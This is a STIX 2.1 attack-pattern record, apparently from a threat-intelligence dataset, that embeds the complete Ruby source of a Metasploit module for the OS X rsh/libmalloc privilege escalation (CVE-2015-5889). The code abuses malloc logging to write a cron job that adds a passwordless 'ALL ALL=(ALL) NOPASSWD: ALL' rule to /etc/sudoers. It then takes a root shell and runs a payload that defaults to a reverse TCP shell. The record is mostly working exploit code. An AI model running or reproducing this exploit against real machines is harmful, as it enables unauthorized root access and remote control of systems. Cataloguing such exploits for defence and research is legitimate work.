{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73fa03ff-5f11-415b-94db-e14db6be0f70",
    "created": "2024-08-14T16:34:39.937191Z",
    "modified": "2024-08-14T16:34:39.937195Z",
    "name": "Mac OS X 10.9.5 / 10.10.5 - rsh/libmalloc Privilege Escalation",
    "description": " This module writes to the sudoers file without root access by exploiting rsh and malloc log files. Makes sudo require no password, giving access to su even if root is disabled. Works on OS X 10.9.5 to 10.10.5 (patched on 10.11). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/rsh_libmalloc.rb",
            "external_id": "rsh_libmalloc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5889"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mac OS X 10.9.5 / 10.10.5 - rsh/libmalloc Privilege Escalation',\n      'Description'    => %q{\n        This module writes to the sudoers file without root access by exploiting rsh and malloc log files.\n        Makes sudo require no password, giving access to su even if root is disabled.\n        Works on OS X 10.9.5 to 10.10.5 (patched on 10.11).\n      },\n      'Author'         => [\n        'rebel',      # Vulnerability discovery and PoC\n        'shandelman116'  # Copy/paste AND translator monkey\n      ],\n      'References'     => [\n        ['EDB', '38371'],\n        ['CVE', '2015-5889']\n      ],\n      'DisclosureDate' => '2015-10-01',\n      'License'        => MSF_LICENSE,\n      # Want to ensure that this can be used on Python Meterpreter sessions as well\n      'Platform'       => ['osx', 'python'],\n      'Arch'           => [ARCH_X64, ARCH_PYTHON],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Mac OS X 10.9.5-10.10.5', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp'\n      }\n    ))\n\n    register_options [\n      OptInt.new('WaitTime', [true, 'Seconds to wait for exploit to work', 60]),\n      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Check OS\n    os_check\n\n    # Check if crontab file existed already so it can be restored at cleanup\n    if file_exist? \"/etc/crontab\"\n      @crontab_original = read_file(\"/etc/crontab\")\n    else\n      @crontab_original = nil\n    end\n\n    # Writing payload\n    if payload.arch.include?(ARCH_X64)\n      vprint_status(\"Writing payload to #{payload_file}.\")\n      write_file(payload_file, payload_source)\n      vprint_status(\"Finished writing payload file.\")\n      register_file_for_cleanup(payload_file)\n    elsif payload.arch.include?(ARCH_PYTHON)\n      vprint_status(\"No need to write payload. Will simply execute after exploit\")\n      vprint_status(\"Payload encodeded is #{payload.encoded}\")\n    end\n\n    # Run exploit\n    sploit\n\n    # Execute payload\n    print_status('Executing payload...')\n    if payload.arch.include?(ARCH_X64)\n      cmd_exec(\"chmod +x #{payload_file}; #{payload_file} & disown\")\n    elsif payload.arch.include?(ARCH_PYTHON)\n      cmd_exec(\"python -c \\\"#{payload.encoded}\\\" & disown\")\n    end\n    vprint_status(\"Finished executing payload.\")\n  end\n\n  def os_check\n    # Get sysinfo\n    sysinfo = get_sysinfo\n    # Make sure its OS X (Darwin)\n    unless sysinfo[\"Kernel\"].include? \"Darwin\"\n      print_warning(\"The target system does not appear to be running OS X!\")\n      print_warning(\"Kernel information: #{sysinfo['Kernel']}\")\n      return\n    end\n    # Make sure its not greater than 10.5 or less than 9.5\n    version = sysinfo[\"ProductVersion\"]\n    minor_version = version[3...version.length].to_f\n    unless minor_version >= 9.5 && minor_version <= 10.5\n      print_warning(\"The target version of OS X does not appear to be compatible with the exploit!\")\n      print_warning(\"Target is running OS X #{sysinfo['ProductVersion']}\")\n    end\n  end\n\n  def sploit\n    user = cmd_exec(\"whoami\").chomp\n    vprint_status(\"The current effective user is #{user}. Starting the sploit\")\n    # Get size of sudoers file\n    sudoer_path = \"/etc/sudoers\"\n    size = get_stat_size(sudoer_path)\n\n    # Set up the environment and command for spawning rsh and writing to crontab file\n    rb_script = \"e={\\\"MallocLogFile\\\"=>\\\"/etc/crontab\\\",\\\"MallocStackLogging\\\"=>\\\"yes\\\",\\\"MallocStackLoggingDirectory\\\"=>\\\"a\\n* * * * * root echo \\\\\\\"ALL ALL=(ALL) NOPASSWD: ALL\\\\\\\" >> /etc/sudoers\\n\\n\\n\\n\\n\\\"}; Process.spawn(e,[\\\"/usr/bin/rsh\\\",\\\"rsh\\\"],\\\"localhost\\\",[:out, :err]=>\\\"/dev/null\\\")\"\n    rb_cmd = \"ruby -e '#{rb_script}'\"\n\n    # Attempt to execute\n    print_status(\"Attempting to write /etc/crontab...\")\n    cmd_exec(rb_cmd)\n    vprint_status(\"Now to check whether the script worked...\")\n\n    # Check whether it worked\n    crontab = read_file(\"/etc/crontab\")\n    vprint_status(\"Reading crontab yielded the following response: #{crontab}\")\n    unless crontab.include? \"ALL ALL=(ALL) NOPASSWD: ALL\"\n      vprint_error(\"Bad news... it did not write to the file.\")\n      fail_with(Failure::NotVulnerable, \"Could not successfully write to crontab file.\")\n    end\n\n    print_good(\"Succesfully wrote to crontab file!\")\n\n    # Wait for sudoers to change\n    new_size = get_stat_size(sudoer_path)\n    print_status(\"Waiting for sudoers file to change...\")\n\n    # Start timeout block\n    begin\n      Timeout.timeout(datastore['WaitTime']) {\n        while new_size <= size\n          Rex.sleep(1)\n          new_size = get_stat_size(sudoer_path)\n        end\n      }\n    rescue Timeout::Error\n      fail_with(Failure::TimeoutExpired, \"Sudoers file size has still not changed after waiting the maximum amount of time. Try increasing WaitTime.\")\n    end\n    print_good(\"Sudoers file has changed!\")\n\n    # Confirming root access\n    print_status(\"Attempting to start root shell...\")\n    cmd_exec(\"sudo -s su\")\n    user = cmd_exec(\"whoami\")\n    unless user.include? \"root\"\n      fail_with(Failure::UnexpectedReply, \"Unable to acquire root access. Whoami returned: #{user}\")\n    end\n    print_good(\"Success! Acquired root access!\")\n  end\n\n  def get_stat_size(file_path)\n    cmd = \"env -i [$(stat -s #{file_path})] bash -c 'echo $st_size'\"\n    response = cmd_exec(cmd)\n    vprint_status(\"Response to stat size query is #{response}\")\n    begin\n      size = Integer(response)\n      return size\n    rescue ArgumentError\n      fail_with(Failure::UnexpectedReply, \"Could not get stat size!\")\n    end\n  end\n\n  def payload_source\n    if payload.arch.include?(ARCH_X64)\n      return Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    elsif payload.arch.include?(ARCH_PYTHON)\n      return payload.encoded\n    end\n  end\n\n  def payload_file\n    @payload_file ||= \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\n\n  def cleanup\n    vprint_status(\"Starting the cron restore process...\")\n    super\n    # Restore crontab back to is original state\n    # If we don't do this, then cron will continue to append the no password rule to sudoers.\n    if @crontab_original.nil?\n      # Erase crontab file and kill cron process since it did not exist before\n      vprint_status(\"Killing cron process and removing crontab file since it did not exist prior to exploit.\")\n      rm_ret = cmd_exec(\"rm /etc/crontab 2>/dev/null; echo $?\")\n      if rm_ret.chomp.to_i == 0\n        vprint_good(\"Successfully removed crontab file!\")\n      else\n        print_warning(\"Could not remove crontab file.\")\n      end\n      Rex.sleep(1)\n      kill_ret = cmd_exec(\"killall cron 2>/dev/null; echo $?\")\n      if kill_ret.chomp.to_i == 0\n        vprint_good(\"Succesfully killed cron!\")\n      else\n        print_warning(\"Could not kill cron process.\")\n      end\n    else\n      # Write back the original content of crontab\n      vprint_status(\"Restoring crontab file back to original contents. No need for it anymore.\")\n      cmd_exec(\"echo '#{@crontab_original}' > /etc/crontab\")\n    end\n    vprint_status(\"Finished the cleanup process.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-01",
    "x_mitre_platforms": [
        "['osx', 'python']"
    ]
}